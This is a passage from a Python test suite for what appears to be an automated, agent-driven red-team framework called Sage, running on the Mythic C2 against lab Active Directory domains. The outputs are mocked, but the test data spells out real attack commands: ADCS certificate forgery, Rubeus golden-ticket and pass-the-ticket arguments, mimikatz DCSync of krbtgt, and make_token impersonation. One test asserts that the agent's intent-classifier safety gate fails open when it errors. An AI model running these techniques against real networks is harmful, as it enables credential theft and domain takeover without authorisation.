                "target": "domain=lab.local;account=administrator;ca_host=ca01;callback=13",
                "preconditions": [],
                "effects": ["da:lab.local", "certificate-auth:administrator@lab.local"],
                "intent": {
                    "capability": "adcs-certificate-auth",
                    "domain": "lab.local",
                    "account": "administrator",
                    "callback_id": "13",
                    "ca_host": "ca01",
                },
                "verifier": {},
                "reason": "",
                "source_facts": [],
            },
            "inputs": {
                "domain": "lab.local",
                "target_domain": "lab.local",
                "account": "administrator",
                "callback_id": "13",
                "certificate_already_forged": True,
                "forged_pfx_path": r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
                "forged_pfx_password": "SageCert!administrator_lab_local_13",
            },
        }, sort_keys=True)

    monkeypatch.setattr(mt, "materialize_capability_inputs", fake_materialize)
    ticket = base64.b64encode(b"C" * 80).decode()
    outputs = iter([
        "No tickets in current context.",
        "Access is denied.",
        f"[*] Action: Ask TGT\n[*] base64(ticket.kirbi):\n{ticket}\n",
        "Successfully impersonated local\\user for local access and lab.local\\administrator for remote access.",
        "Added Ticket to Ticket Store",
        "krbtgt/lab.local for administrator@lab.local",
        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13\r\n Directory of \\\\ca01.lab.local\\C$\r\nWindows\r\n",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=9192):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-certificate-auth",
                "domain": "lab.local",
                "account": "administrator",
                "ca_host": "ca01",
                "callback_id": "13",
            },
            {"timeout": 5},
        )))

    assert result["ok"] is True, result
    assert materialize_calls["count"] == 1
    assert calls["issue"] == 7
    assert result["issued"][1]["parameters"] == r"dir \\ca01.lab.local\C$"
    assert result["issued"][-1]["parameters"] == (
        r"echo SAGE_CERT_AUTH_PROOF_administrator_lab_local_13 & dir \\ca01.lab.local\C$"
    )
    assert "da:lab.local" in result["achieved_effects"]
    assert "certificate-auth:administrator@lab.local" in result["achieved_effects"]


def test_execute_capability_adcs_certificate_auth_does_not_reuse_generic_existing_context(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [_proof_hop("adcs-ca-private-key:ca01@lab.local", 9000, callback_id="13")]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)
    materialize_calls = {"count": 0}

    async def fail_materialize(action, inputs=None):
        materialize_calls["count"] += 1
        return json.dumps({
            "ok": False,
            "reason": "materializer reached after generic current-context preflight",
            "missing": ["certificate_auth_material"],
        })

    monkeypatch.setattr(mt, "materialize_capability_inputs", fail_materialize)
    outputs = iter([
        "krbtgt/lab.local for administrator@lab.local",
        "SAGE_CERT_AUTH_PROOF_administrator_lab_local_13\r\n Directory of \\\\dc01.lab.local\\C$\r\nWindows\r\n",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=9292):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-certificate-auth",
                "domain": "lab.local",
                "account": "administrator",
                "ca_host": "ca01",
                "callback_id": "13",
            },
            {"proof_host": "dc01.lab.local", "timeout": 5},
        )))

    assert result["ok"] is False
    assert result["verdict"] == "failed"
    assert materialize_calls["count"] == 1
    assert calls["issue"] == 2
    assert [item["command"] for item in result["issued"]] == ["shell", "shell"]
    assert result["issued"][0]["parameters"] == "klist"
    assert result["reason"] == "materializer reached after generic current-context preflight"
    assert "make_token" not in {item["command"] for item in result["issued"]}
    assert "da:lab.local" not in {
        effect for hop in mt._engagement_hops for effect in hop.satisfied_effects
    }


def test_execute_capability_adcs_certificate_auth_records_failed_proof_without_achieving(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [_proof_hop("adcs-ca-private-key:ca01@lab.local", 9000, callback_id="13")]
    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(0, result=[])
    mt._validate_command_parameters = lambda command, parameters, callback_display_id: asyncio.sleep(0, result=None)

    async def fake_materialize(action, inputs=None):
        return json.dumps({
            "ok": True,
            "capability": "adcs-certificate-auth",
            "action": {
                "name": "adcs-certificate-auth",
                "target": "domain=lab.local;account=administrator;callback=13",
                "preconditions": [],
                "effects": ["da:lab.local", "certificate-auth:administrator@lab.local"],
                "intent": {
                    "capability": "adcs-certificate-auth",
                    "domain": "lab.local",
                    "account": "administrator",
                    "callback_id": "13",
                },
                "verifier": {},
                "reason": "",
                "source_facts": [],
            },
            "inputs": {
                "domain": "lab.local",
                "target_domain": "lab.local",
                "account": "administrator",
                "callback_id": "13",
                "certificate_already_forged": True,
                "forged_pfx_path": r"C:\Windows\Temp\sage_forged_cert_administrator_lab_local_13.pfx",
                "forged_pfx_password": "SageCert!administrator_lab_local_13",
                "proof_host": "dc01.lab.local",
                "proof_resource": r"\\dc01.lab.local\C$",
            },
        }, sort_keys=True)

    monkeypatch.setattr(mt, "materialize_capability_inputs", fake_materialize)
    ticket = base64.b64encode(b"B" * 80).decode()
    outputs = iter([
        "No tickets in current context.",
        "Access is denied.",
        f"[*] base64(ticket.kirbi):\n{ticket}\n",
        "Successfully impersonated local\\user for local access and lab.local\\administrator for remote access.",
        "Added Ticket to Ticket Store",
        "krbtgt/lab.local for administrator@lab.local",
        "Access is denied.",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=9393):
        result = json.loads(asyncio.run(mt.execute_capability(
            {
                "capability": "adcs-certificate-auth",
                "domain": "lab.local",
                "account": "administrator",
                "callback_id": "13",
            },
            {"proof_host": "dc01.lab.local", "timeout": 5},
    )))

    assert result["ok"] is False
    assert result["verdict"] == "partial"
    assert calls["issue"] == 7
    assert result["recorded_failed_effects"] == [
        "certificate-auth:administrator@lab.local",
        "da:lab.local",
    ]
    assert "da:lab.local" not in {
        effect
        for hop in mt._engagement_hops
        if hop.status == "achieved"
        for effect in hop.satisfied_effects
    }
    failed = mt._engagement_hops[-1]
    assert failed.status == "failed"
    assert failed.technique == "capability:adcs-certificate-auth"
    assert failed.evidence["terminal_failure"] is True
    assert failed.evidence["failure_class"] == "genuine"


def test_capability_executor_records_transient_failure_as_retryable():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        preconditions=[],
        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        intent={"capability": "adcs-certificate-auth", "domain": "lab.local", "account": "administrator"},
    )
    payload = {
        "ok": False,
        "verdict": "failed",
        "reason": "No answer from domain controller",
        "transaction": {"status": "command_failed"},
    }
    issued = [{
        "command": "execute_assembly",
        "task_id": 56,
        "result_class": "transient",
        "_output": "Failed to get response from Domain Controller\nNo answer from domain controller",
    }]

    recorded = mt._capability_executor_record_failed_attempt(
        payload,
        action,
        {"domain": "lab.local", "account": "administrator"},
        "13",
        issued,
        {"callback_id": "13"},
    )

    assert recorded == ["certificate-auth:administrator@lab.local", "da:lab.local"]
    assert payload["failure_class"] == "transient"
    assert payload["retryable_failure"] is True
    failed = mt._engagement_hops[-1]
    assert failed.status == "failed"
    assert failed.evidence["terminal_failure"] is False
    assert failed.evidence["retryable_failure"] is True
    assert mt._capability_failed_effects() == set()


def test_execute_capability_eval_injected_blocker_records_terminal_gpo_failure(monkeypatch):
    mt = _make_tools()
    monkeypatch.setenv(
        "SAGE_EVAL_INJECT_CAPABILITY_BLOCKER_JSON",
        json.dumps({
            "capability": "gpo-controlled-system-exec",
            "target_contains": "gpo=srv02-policy;domain=range.local",
            "reason": "endpoint protection blocked the staged GPO payload on srv02",
            "probe": {
                "defender_blocked": True,
                "target_domain": "range.local",
                "target_host": "srv02",
            },
        }),
    )
    action = capabilities.CapabilityAction(
        name="gpo-controlled-system-exec",
        target="gpo=srv02-policy;domain=range.local",
        preconditions=[],
        effects=["system-exec:gpo:srv02-policy@range.local"],
        intent={
            "capability": "gpo-controlled-system-exec",
            "gpo": "srv02-policy",
            "domain": "range.local",
        },
    )

    result = json.loads(asyncio.run(mt.execute_capability(action, {"callback_id": "13"})))

    assert result["ok"] is False
    assert result["verdict"] == "blocked"
    assert result["eval_injected_blocker"] is True
    assert result["issued"] == []
    assert result["recorded_failed_effects"] == ["system-exec:gpo:srv02-policy@range.local"]
    failed = mt._engagement_hops[-1]
    assert failed.status == "blocked"
    assert failed.evidence["defender_blocked"] is True
    assert failed.evidence["terminal_failure"] is True
    assert failed.evidence["failure_class"] == "genuine"
    assert failed.evidence["verify_reason"] == "endpoint protection blocked the staged GPO payload on srv02"


def test_execute_capability_eval_injected_transient_blocker_releases_after_repair_effect(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [
        _proof_hop("local-admin:ca01@range.local", 55),
        _proof_hop("remote-exec:ca01@range.local", 56),
    ]
    monkeypatch.setenv(
        "SAGE_EVAL_INJECT_CAPABILITY_BLOCKER_JSON",
        json.dumps({
            "capability": "adcs-ca-private-key-export",
            "target_contains": "target=ca01;target_domain=range.local",
            "reason": "endpoint protection blocked CA export tooling on ca01",
            "failure_class": "transient",
            "skip_if_achieved_effect": "endpoint-protection-adjusted:ca01@range.local",
            "probe": {
                "tool_execution_failed": True,
                "defender_blocked": True,
                "target_domain": "range.local",
                "target_host": "ca01",
            },
        }),
    )
    action = capabilities.CapabilityAction(
        name="adcs-ca-private-key-export",
        target="target=ca01;target_domain=range.local",
        preconditions=[],
        effects=["adcs-ca-private-key:ca01@range.local"],
        intent={"capability": "adcs-ca-private-key-export"},
    )

    result = json.loads(asyncio.run(mt.execute_capability(action, {"callback_id": "13"})))

    assert result["ok"] is False
    assert result["verdict"] == "blocked"
    assert result["failure_class"] == "transient"
    failed = mt._engagement_hops[-1]
    assert failed.evidence["terminal_failure"] is False
    assert failed.evidence["retryable_failure"] is True
    mt._engagement_hops.append(_proof_hop("endpoint-protection-adjusted:ca01@range.local", 57))
    assert mt._capability_executor_injected_blocker(action, {"callback_id": "13"}, "13", capabilities) is None


def test_execute_capability_eval_injected_blocker_can_record_declared_action_effect(monkeypatch):
    mt = _make_tools()
    mt._engagement_hops = [_proof_hop("adcs-ca-private-key:ca01@lab.local", 58)]
    monkeypatch.setenv(
        "SAGE_EVAL_INJECT_CAPABILITY_BLOCKER_JSON",
        json.dumps({
            "capability": "adcs-certificate-auth",
            "target_contains": "domain=lab.local;account=administrator;ca_host=ca01",
            "reason": "certificate authentication failed after verified CA export on ca01",
            "failure_class": "genuine",
            "record_failed_effect": "certificate-auth:administrator@lab.local",
            "probe": {
                "pkinit_failed": True,
                "target_domain": "lab.local",
                "target_host": "ca01",
                "account": "administrator",
            },
        }),
    )
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=13",
        preconditions=[],
        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "13",
        },
    )

    result = json.loads(asyncio.run(mt.execute_capability(action, {"callback_id": "13"})))

    assert result["ok"] is False
    assert result["verdict"] == "blocked"
    assert result["record_failed_effect"] == "certificate-auth:administrator@lab.local"
    failed = mt._engagement_hops[-1]
    assert failed.status == "blocked"
    assert failed.effect == "certificate-auth:administrator@lab.local"
    assert failed.satisfied_effects == [
        "certificate-auth:administrator@lab.local",
        "da:lab.local",
    ]


def test_execute_capability_output_preview_redacts_ticket_store_json():
    mt = _make_tools()
    ticket = base64.b64encode(b"C" * 220).decode()

    preview = mt._capability_executor_output_preview(
        f'{{"tickets":[{{"ticket":"{ticket}","ticket_flags":"Forwardable"}}]}}'
    )

    assert ticket not in preview
    assert "<kerberos_ticket_base64>" in preview or "<base64_blob>" in preview


@pytest.mark.parametrize("command", ["ticket_store_add", "ticket_cache_add"])
def test_kerberos_ticket_artifact_cache_binds_ticket_import_commands(command):
    mt = _make_tools()
    ticket = "A" * 88
    rubeus_output = f"""
[*] base64(ticket.kirbi):

      {ticket[:18]}
      {ticket[18:]}

[SAGE OPSEC] footprint total=6
"""

    mt._cache_kerberos_ticket_artifact(
        "execute_assembly",
        {"assembly_arguments": "golden /user:Administrator /domain:lab.local /nowrap"},
        rubeus_output,
    )
    bound = mt._bind_kerberos_ticket_artifact(
        command,
        {"base64ticket": "not-valid-base64!", "existingTicket": {"credential": "not-valid-base64!"}},
    )

    assert bound["base64ticket"] == ticket
    assert bound["existingTicket"]["credential"] == ticket


def test_kerberos_ticket_artifact_binds_inter_realm_referral_across_param_shapes():
    # The inter-realm referral (asktgs) runs via execute_assembly; the captured ticket must be substituted into
    # the `/ticket:{{kerberos_ticket_base64}}` placeholder REGARDLESS of how argument resolution shaped the
    # params by issue time. The controller path delivers Apollo-native {Assembly, Arguments} keys (capitalized)
    # or a JSON string — a fixed lowercase-key match silently no-ops on those and shipped Rubeus the literal
    # placeholder live (KRBTGT_DUMPED wall stuck). All four shapes must substitute.
    import json as _json

    mt = _make_tools()
    ticket = "Z" * 120
    mt._capability_artifacts["kerberos_ticket_base64"] = ticket
    args = "asktgs /ticket:{{kerberos_ticket_base64}} /service:krbtgt/parent.local /dc:dc01.child.local /nowrap"

    shapes = [
        {"assembly_name": "Rubeus.exe", "assembly_arguments": args},          # adapter lowercase keys
        {"Assembly": "Rubeus.exe", "Arguments": args},                        # Apollo translated keys
        _json.dumps({"assembly_name": "Rubeus.exe", "assembly_arguments": args}),
        _json.dumps({"Assembly": "Rubeus.exe", "Arguments": args}),
    ]
    for params in shapes:
        bound = mt._bind_kerberos_ticket_artifact("execute_assembly", params)
        blob = bound if isinstance(bound, str) else _json.dumps(bound)
        assert ticket in blob, f"ticket not substituted for shape {params!r}"
        assert "{{kerberos_ticket_base64}}" not in blob, f"literal placeholder survived for {params!r}"

    # An execute_assembly with no ticket placeholder is left untouched (no spurious substitution).
    untouched = mt._bind_kerberos_ticket_artifact(
        "execute_assembly", {"Assembly": "Rubeus.exe", "Arguments": "triage"}
    )
    assert untouched == {"Assembly": "Rubeus.exe", "Arguments": "triage"}


@pytest.mark.parametrize("command", ["invoke-assembly", "invoke_assembly"])
def test_kerberos_ticket_artifact_binds_current_session_ptt_invoke_assembly(command):
    mt = _make_tools()
    ticket = "Y" * 120
    mt._capability_artifacts["kerberos_ticket_base64"] = ticket
    args = "ptt /ticket:{{kerberos_ticket_base64}}"

    shapes = [
        {"assembly": "Rubeus.exe", "arguments": args},
        {"assembly": "Rubeus.exe", "args": args},
        json.dumps({"assembly": "Rubeus.exe", "arguments": args}),
        json.dumps({"assembly": "Rubeus.exe", "args": args}),
    ]
    for params in shapes:
        bound = mt._bind_kerberos_ticket_artifact(command, params)
        blob = bound if isinstance(bound, str) else json.dumps(bound)
        assert ticket in blob, f"ticket not substituted for shape {params!r}"
        assert "{{kerberos_ticket_base64}}" not in blob, f"literal placeholder survived for {params!r}"


def test_issue_task_refuses_duplicate_make_token_context():
    mt = _make_tools()

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    params = {
        "credential": {
            "account": "Administrator",
            "realm": "sevenkingdoms.local",
            "credential": "SageNetOnlyContext1!",
            "type": "plaintext",
        },
        "netOnly": True,
    }

    with _split_issue("Successfully impersonated local\\user for local access and sevenkingdoms.local\\Administrator for remote access."):
        first = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", params, 11, timeout=5))
        second = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", params, 11, timeout=5))

    assert "Successfully impersonated" in first
    assert "STOP — a matching NetOnly Kerberos logon context was already created" in second


def _seed_ensure_context_service_proof(mt: MythicTools) -> str:
    action = capabilities.CapabilityAction(
        name="ensure-kerberos-context",
        target="domain=sevenkingdoms.local;callback=13;source_domain=north.sevenkingdoms.local",
        preconditions=[
            "da:sevenkingdoms.local",
            "krbtgt-hash:north.sevenkingdoms.local",
            "live-callback:13",
        ],
        effects=["kerberos-context:sevenkingdoms.local@callback:13"],
        intent={
            "capability": "ensure-kerberos-context",
            "domain": "sevenkingdoms.local",
            "source_domain": "north.sevenkingdoms.local",
            "callback_id": "13",
        },
    )
    params = "dir \\\\KINGSLANDING.SEVENKINGDOMS.LOCAL\\C$"
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("shell", params)
    ] = {
        "capability": "ensure-kerberos-context",
        "target": action.target,
        "effects": list(action.effects),
        "intent": dict(action.intent),
        "action": asdict(action),
        "expected_probe": "extract_ticket_probe",
        "produces": ["kerberos_service_access_probe"],
        "consumes": ["kerberos_ticket_imported", "kerberos_logon_context"],
    }
    return params


def test_ensure_context_service_proof_still_stops_without_context_change():
    mt = _make_tools()

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    params = _seed_ensure_context_service_proof(mt)
    calls = {"issue": 0}

    with _split_issue("Access is denied.", calls):
        first = asyncio.run(mt.issue_task_and_waitfor_task_output("run", params, 13, timeout=5))
        second = asyncio.run(mt.issue_task_and_waitfor_task_output("run", params, 13, timeout=5))

    assert first.startswith("genuine failure")
    assert second.startswith("STOP")
    assert calls["issue"] == 1


def test_ensure_context_service_proof_retry_key_advances_after_ticket_import():
    mt = _make_tools()

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    proof_params = _seed_ensure_context_service_proof(mt)
    make_token_params = {
        "credential": {
            "account": "Administrator",
            "realm": "sevenkingdoms.local",
            "credential": "SageNetOnlyContext1!",
            "type": "plaintext",
        },
        "netOnly": True,
    }
    outputs = iter([
        "Access is denied.",
        "Successfully impersonated local\\user for local access and sevenkingdoms.local\\Administrator for remote access.",
        "Added Ticket to Ticket Store",
        " Directory of \\\\KINGSLANDING.SEVENKINGDOMS.LOCAL\\C$\r\nWindows\r\n",
    ])
    calls = {"issue": 0}

    with _split_issue(lambda: next(outputs), calls, display_id=7171):
        preflight = asyncio.run(mt.issue_task_and_waitfor_task_output("run", proof_params, 13, timeout=5))
        token = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", make_token_params, 13, timeout=5))
        imported = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "ticket_store_add",
                {"base64ticket": "A" * 88},
                13,
                timeout=5,
            )
        )
        proof = asyncio.run(mt.issue_task_and_waitfor_task_output("run", proof_params, 13, timeout=5))

    assert preflight.startswith("genuine failure")
    assert "Successfully impersonated" in token
    assert "Added Ticket" in imported
    assert "Directory of" in proof
    assert calls["issue"] == 4
    assert "kerberos-context:sevenkingdoms.local@callback:13" in {
        effect for hop in mt._engagement_hops for effect in hop.satisfied_effects
    }
    assert "da:sevenkingdoms.local" in {
        effect for hop in mt._engagement_hops for effect in hop.satisfied_effects
    }


def test_default_ensure_context_effects_include_cross_domain_admin_control():
    mt = _make_tools()

    effects = mt._default_capability_effects(
        "ensure-kerberos-context",
        {
            "capability": "ensure-kerberos-context",
            "domain": "sevenkingdoms.local",
            "target_domain": "sevenkingdoms.local",
            "source_domain": "north.sevenkingdoms.local",
            "callback_id": "13",
        },
        {},
    )

    assert effects == [
        "da:sevenkingdoms.local",
        "kerberos-context:sevenkingdoms.local@callback:13",
    ]


def test_forge_golden_ticket_service_proof_records_da_effect():
    mt = _make_tools()

    async def no_schema(command, callback_display_id):
        return []

    async def no_validation(command, parameters, callback_display_id):
        return None

    mt._fetch_command_schema = no_schema
    mt._validate_command_parameters = no_validation
    action = capabilities.CapabilityAction(
        name="forge-golden-ticket",
        target="domain=sevenkingdoms.local",
        preconditions=["krbtgt-hash:sevenkingdoms.local"],
        effects=["da:sevenkingdoms.local"],
        intent={
            "capability": "forge-golden-ticket",
            "domain": "sevenkingdoms.local",
            "user": "Administrator",
        },
    )
    params = "dir \\\\KINGSLANDING.SEVENKINGDOMS.LOCAL\\C$"
    mt._deterministic_capability_command_contexts[
        mythic_tools._capability_command_key("shell", params)
    ] = {
        "capability": "forge-golden-ticket",
        "target": action.target,
        "effects": list(action.effects),
        "intent": dict(action.intent),
        "action": asdict(action),
        "expected_probe": "extract_ticket_probe",
        "produces": ["kerberos_service_access_probe"],
        "consumes": ["kerberos_ticket_imported", "kerberos_logon_context"],
    }

    with _split_issue(" Directory of \\\\KINGSLANDING.SEVENKINGDOMS.LOCAL\\C$\r\nWindows\r\n", display_id=8181):
        proof = asyncio.run(mt.issue_task_and_waitfor_task_output("shell", params, 13, timeout=5))

    assert "Directory of" in proof
    assert "da:sevenkingdoms.local" in {
        effect for hop in mt._engagement_hops for effect in hop.satisfied_effects
    }
    assert mt._engagement_hops[-1].evidence["mythic_task_id"] == 8181


def test_gate_failure_fails_open_and_issues_normally():
    calls = {"issue": 0}
    mt = _make_tools()
    with patch.object(intent_classifier, "classify_tool_call", side_effect=RuntimeError("boom")), \
        _split_issue("normal result", calls):
        result = asyncio.run(
            mt.issue_task_and_waitfor_task_output(
                "execute_assembly",
                "--Assembly SharpGPOAbuse.exe --GPOName NewGPO",
                11,
            )
        )

    assert result == "normal result"
    assert calls["issue"] == 1


def test_capability_effects_achieved_requires_specific_effect_not_coarse_da():
    # adcs-certificate-auth declares BOTH da:{domain} (coarse) AND certificate-auth:{acct}@{domain} (specific).
    # If da:{domain} was already achieved by some OTHER technique, the cert-auth capability must NOT short-circuit
    # as already-achieved — its specific proof was never gathered (2026-06-12 audit, MED any-overlap dedup).
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=lab.local;account=administrator",
        preconditions=[],
        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        intent={"capability": "adcs-certificate-auth", "domain": "lab.local", "account": "administrator"},
    )
    # coarse da: already met by another path -> NOT a no-op (the specific cert-auth proof is still required)
    assert mt._capability_action_effects_achieved(action, achieved_effects={"da:lab.local"}) is False
    # the SPECIFIC effect present -> genuine idempotent no-op
    assert mt._capability_action_effects_achieved(
        action, achieved_effects={"certificate-auth:administrator@lab.local"}) is True


def test_current_context_capabilities_do_not_short_circuit_on_ledger_effect():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="ensure-kerberos-context",
        target="domain=lab.local;callback=13",
        preconditions=[],
        effects=["kerberos-context:lab.local@callback:13"],
        intent={"capability": "ensure-kerberos-context", "domain": "lab.local", "callback_id": "13"},
    )

    assert mt._capability_action_effects_achieved(
        action,
        achieved_effects={"kerberos-context:lab.local@callback:13"},
    ) is False


def test_capability_effects_achieved_canonicalizes_netbios_credential_effects():
    mt = _make_tools()
    action = capabilities.CapabilityAction(
        name="dcsync-account",
        target="domain=sevenkingdoms.local;account=cersei.lannister",
        preconditions=[],
        effects=["creds:cersei.lannister@sevenkingdoms.local"],
        intent={
            "capability": "dcsync-account",
            "domain": "sevenkingdoms.local",
            "account": "cersei.lannister",
        },
    )

    assert mt._capability_action_effects_achieved(
        action,
        achieved_effects={r"creds:sevenkingdoms\cersei.lannister@sevenkingdoms.local"},
    ) is True


# --- D2: upload hash-dedup (refuse re-upload of an unchanged binary) ---

def test_register_file_dedup_reuses_on_hash_match(monkeypatch):
    mt = _make_tools()
    async def fake_find(md5, sha1):
        return {"agent_file_id": "existing-uuid", "filename_utf8": "SharpHound.exe"}
    monkeypatch.setattr(mt, "_find_uploaded_file_by_hash", fake_find)
    called = {"register": 0}
    async def fake_register(filename, contents):
        called["register"] += 1
        return "new-uuid"
    monkeypatch.setattr(mt, "_register_file", fake_register)
    uuid, reused = asyncio.run(mt._register_file_dedup("SharpHound.exe", b"abc"))
    assert reused is True and uuid == "existing-uuid"
    assert called["register"] == 0  # the identical-hash file is reused, NOT re-uploaded


def test_register_file_prefers_v4_root_webhook(monkeypatch):
    mt = _make_tools()
    calls = []

    async def fake_post(path, filename, content):
        calls.append((path, filename, content))
        return 200, json.dumps({"status": "success", "agent_file_id": "v4-uuid"})

    monkeypatch.setattr(mt, "_post_registered_file_webhook", fake_post)

    uuid = asyncio.run(mt._register_file("SharpHound.exe", b"abc"))

    assert uuid == "v4-uuid"
    assert calls == [("/task_upload_file_webhook", "SharpHound.exe", b"abc")]


def test_register_file_falls_back_to_legacy_webhook_only_when_v4_route_missing(monkeypatch):
    mt = _make_tools()
    calls = []

    async def fake_post(path, filename, content):
        calls.append(path)
        if path == "/task_upload_file_webhook":
            return 404, "404 page not found"
        return 200, json.dumps({"status": "success", "agent_file_id": "legacy-uuid"})

    monkeypatch.setattr(mt, "_post_registered_file_webhook", fake_post)

    uuid = asyncio.run(mt._register_file("SharpHound.exe", b"abc"))

    assert uuid == "legacy-uuid"
    assert calls == ["/task_upload_file_webhook", "/api/v1.4/task_upload_file_webhook"]


def test_register_file_dedup_uploads_on_hash_miss(monkeypatch):
    mt = _make_tools()
    async def fake_find(md5, sha1):
        return None
    monkeypatch.setattr(mt, "_find_uploaded_file_by_hash", fake_find)
    called = {"register": 0}
    async def fake_register(filename, contents):
        called["register"] += 1
        return "new-uuid"
    monkeypatch.setattr(mt, "_register_file", fake_register)
    uuid, reused = asyncio.run(mt._register_file_dedup("Changed.exe", b"xyz"))
    assert reused is False and uuid == "new-uuid"
    assert called["register"] == 1  # a changed/new-hash binary uploads normally


def test_register_file_dedup_uploads_when_hash_match_has_different_filename(monkeypatch):
    mt = _make_tools()

    async def fake_find(md5, sha1):
        return {"agent_file_id": "other-uuid", "filename_utf8": "Seatbelt.exe"}

    called = {"register": 0}

    async def fake_register(filename, contents):
        called["register"] += 1
        assert filename == "Rubeus.exe"
        return "rubeus-uuid"

    monkeypatch.setattr(mt, "_find_uploaded_file_by_hash", fake_find)
    monkeypatch.setattr(mt, "_register_file", fake_register)

    uuid, reused = asyncio.run(mt._register_file_dedup("Rubeus.exe", b"same-bytes"))

    assert reused is False
    assert uuid == "rubeus-uuid"
    assert called["register"] == 1


def test_ensure_tool_uploaded_reuses_same_name_when_hash_matches(monkeypatch, tmp_path):
    mt = _make_tools()
    content = b"rubeus-current"
    (tmp_path / "Rubeus.exe").write_bytes(content)
    monkeypatch.setattr(mythic_tools.ttp_library, "TOOLS_DIR", tmp_path)
    md5 = mythic_tools.hashlib.md5(content).hexdigest()
    sha1 = mythic_tools.hashlib.sha1(content).hexdigest()

    async def fake_find_by_name(filename):
        assert filename == "Rubeus.exe"
        return {"agent_file_id": "existing-uuid", "filename_utf8": filename, "md5": md5, "sha1": sha1}

    async def fail_register(*args, **kwargs):
        raise AssertionError("matching same-name hash must not upload a duplicate file")

    monkeypatch.setattr(mt, "_find_uploaded_file_by_name", fake_find_by_name)
    monkeypatch.setattr(mt, "_register_file_dedup", fail_register)

    result = json.loads(asyncio.run(mt.ensure_tool_uploaded("Rubeus.exe")))

    assert result["status"] == "already_present"
    assert result["file_uuid"] == "existing-uuid"
    assert result["dedup"] == "name_hash"


def test_ensure_tool_uploaded_uploads_same_name_when_hash_changed(monkeypatch, tmp_path):
    mt = _make_tools()
    current = b"rubeus-new-build"
    old = b"rubeus-old-build"
    (tmp_path / "Rubeus.exe").write_bytes(current)
    monkeypatch.setattr(mythic_tools.ttp_library, "TOOLS_DIR", tmp_path)
    old_md5 = mythic_tools.hashlib.md5(old).hexdigest()
    old_sha1 = mythic_tools.hashlib.sha1(old).hexdigest()

    async def fake_find_by_name(filename):
        assert filename == "Rubeus.exe"
        return {"agent_file_id": "old-uuid", "filename_utf8": filename, "md5": old_md5, "sha1": old_sha1}

    called = {}

    async def fake_register(filename, content):
        called["filename"] = filename
        called["content"] = content
        return "new-uuid", False

    monkeypatch.setattr(mt, "_find_uploaded_file_by_name", fake_find_by_name)
    monkeypatch.setattr(mt, "_register_file_dedup", fake_register)

    result = json.loads(asyncio.run(mt.ensure_tool_uploaded("Rubeus.exe")))

    assert called == {"filename": "Rubeus.exe", "content": current}
    assert result["status"] == "uploaded"
    assert result["file_uuid"] == "new-uuid"
    assert result["reason"] == "same_name_hash_changed"
    assert result["superseded_file_uuid"] == "old-uuid"


# --- D3: contradiction-downgrade (a refuted precondition reopens instead of looping) ---

_DCSYNC_PARAMS = '{"Command":"mimikatz","Arguments":"lsadump::dcsync /domain:north.sevenkingdoms.local /user:NORTH\\\\krbtgt"}'


def _seed_false_da(mt, monkeypatch, evidence=None):
    ts = "2026-06-12T00:00:00Z"
    state = engagement_state.EngagementState(objective="t", hops=[])
    state = engagement_state.record_hop_result(
        state, "golden-ticket", "north.sevenkingdoms.local", "achieved", evidence or {"source": "issue_task"}, ts)
    mt._engagement_hops = state.hops
    monkeypatch.setattr(mt, "_persist_engagement_ledger", lambda: None)


def test_contradiction_downgrade_8453_access_denied_reopens_false_da_hop(monkeypatch):
    mt = _make_tools()
    _seed_false_da(mt, monkeypatch)
    # 0x2105 / 8453 == DS_DRA_ACCESS_DENIED == a real replication-RIGHTS denial
    out = "ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x00002105 (8453)\n"
    mt._apply_contradiction_downgrade("execute_pe", _DCSYNC_PARAMS, out)
    da_hop = next((h for h in mt._engagement_hops if h.effect == "da:north.sevenkingdoms.local"), None)
    assert da_hop is not None and da_hop.status == "failed"
    assert da_hop.evidence.get("source") == "contradiction-downgrade"


def test_contradiction_downgrade_bad_dn_8439_does_NOT_downgrade(monkeypatch):
    # 0x20f7 / 8439 == DS_DRA_BAD_DN == a malformed-DN / name-resolution error, NOT a rights denial.
    mt = _make_tools()
    _seed_false_da(mt, monkeypatch)
    out = "ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)\n"
    mt._apply_contradiction_downgrade("execute_pe", _DCSYNC_PARAMS, out)
